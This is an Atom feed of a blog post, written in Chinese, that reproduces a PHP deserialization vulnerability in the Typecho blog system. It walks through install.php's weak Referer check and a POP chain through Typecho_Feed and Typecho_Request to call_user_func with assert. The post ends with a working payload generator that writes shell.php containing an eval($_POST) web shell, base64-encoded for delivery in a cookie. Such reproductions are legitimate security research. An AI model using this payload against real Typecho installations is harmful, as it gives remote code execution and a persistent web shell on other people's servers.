<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>tharavel&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://nt0rrent.xyz/"/>
  <updated>2017-10-29T17:20:24.073Z</updated>
  <id>http://nt0rrent.xyz/</id>
  
  <author>
    <name>tharavel</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>typecho反序列化漏洞复现</title>
    <link href="http://nt0rrent.xyz/2017/10/29/typecho/"/>
    <id>http://nt0rrent.xyz/2017/10/29/typecho/</id>
    <published>2017-10-29T14:51:04.482Z</published>
    <updated>2017-10-29T17:20:24.073Z</updated>
    
    <content type="html"><![CDATA[<h2 id="typecho反序列化漏洞复现"><a href="#typecho反序列化漏洞复现" class="headerlink" title="typecho反序列化漏洞复现"></a>typecho反序列化漏洞复现</h2><h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>Typecho是一个基于php的简单轻巧的开源博客系统，最近看到了这个漏洞，就顺手复现了一下。。。</p>
<h3 id="0X01-漏洞版本"><a href="#0X01-漏洞版本" class="headerlink" title="0X01. 漏洞版本"></a>0X01. 漏洞版本</h3><p>V1.1-15.5.12-beta以前</p>
<h3 id="0X02-漏洞分析"><a href="#0X02-漏洞分析" class="headerlink" title="0X02 漏洞分析"></a>0X02 漏洞分析</h3><p>反序列化可控点：install.php 229~235行<br><img src="http://op5cjcnmi.bkt.clouddn.com/1.PNG" alt="此处输入图片的描述"><br>该博客程序判断是否安装的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//判断是否已经安装</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>]) &amp;&amp; file_exists(\__TYPECHO_ROOT_DIR__ . <span class="string">'/config.inc.php'</span>) &amp;&amp; <span class="keyword">empty</span>($_SESSION[<span class="string">'typecho'</span>])) &#123;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 挡掉可能的跨站请求</span></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET) || !<span class="keyword">empty</span>($_POST)) &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $parts = parse_url($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($parts[<span class="string">'port'</span>])) &#123;</div><div class="line">        $parts[<span class="string">'host'</span>] = <span class="string">"&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="string">'host'</span>]) || $_SERVER[<span class="string">'HTTP_HOST'</span>] != $parts[<span class="string">'host'</span>]) &#123;</div><div class="line">        <span class="keyword">exit</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里的判断逻辑有点滑稽，参数中含有finish并且Referer是内网即可进入install.php。。。既然能进入install.php,那么现在先决条件已具备，接着分析。</p>
<p>这里有一个反序列化操作，而参数从cookie获取，可控。   想到构造POP链。既然是序列化，免不了利用对象，于是跟进Typecho_Db对象<br><img src="http://op5cjcnmi.bkt.clouddn.com/2.PNG" alt="此处输入图片的描述"><br>看到这里对传入的参数\$adapterName进行了字符串拼接操作，如果$adapterName是一个实例化对象，就会触发__tostring魔法方法，全局搜索发现__tostring方法出现在以下三个类中：</p>
<blockquote>
<p>Typecho_Feed<br>Typecho_Config<br>Typecho_Db_Query</p>
</blockquote>
<p>分别跟进后发现只有Typecho_Feed类可利用，可利用地点如下：<br><img src="http://op5cjcnmi.bkt.clouddn.com/3.PNG" alt="此处输入图片的描述"><br>在290行，如果screenName是不可访问变量，便会调用__get()魔法方法，搜索__get()方法，有好几处，分析后发现在Typecho_Request类中可以利用。在该类中__get方法调用了get方法，而在get方法中又调用了_applyFilter方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/4.PNG" alt="此处输入图片的描述"></p>
<p>跟进该方法<br><img src="http://op5cjcnmi.bkt.clouddn.com/5.PNG" alt="此处输入图片的描述"><br>醒目的array_map函数和call_user_func函数。。。<br>至此POP链已经构造完成。</p>
<h3 id="0X03-Payload"><a href="#0X03-Payload" class="headerlink" title="0X03 Payload"></a>0X03 Payload</h3><pre><code>&lt;?php
class Typecho_Feed{
    private $_type = &apos;RSS 2.0&apos;;
    private $_items;
    public function __construct($a)
    {
        $this-&gt;_items[] = array(&apos;author&apos;=&gt;$a);
    }
}

class Typecho_Request{
    private $_params = array(&apos;screenName&apos;=&gt;&apos;file_put_contents(&apos;shell.php&apos;, &apos;&lt;?php @eval($_POST[tharavel]);?&gt;&apos;)&apos;);
    private $_filter = array(&apos;assert&apos;);
}

$payload1 = new Typecho_Request();
$payload2 = new Typecho_Feed($payload1);
$exp = array(&apos;adapter&apos; =&gt; $payload2, &apos;prefix&apos; =&gt; &apos;typecho&apos;);

echo base64_encode(serialize($exp));
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;typecho反序列化漏洞复现&quot;&gt;&lt;a href=&quot;#typecho反序列化漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;typecho反序列化漏洞复现&quot;&gt;&lt;/a&gt;typecho反序列化漏洞复现&lt;/h2&gt;&lt;h3 id=&quot;0X00-前言&quot;&gt;&lt;a h
    
    </summary>
    
    
  </entry>
  
</feed>
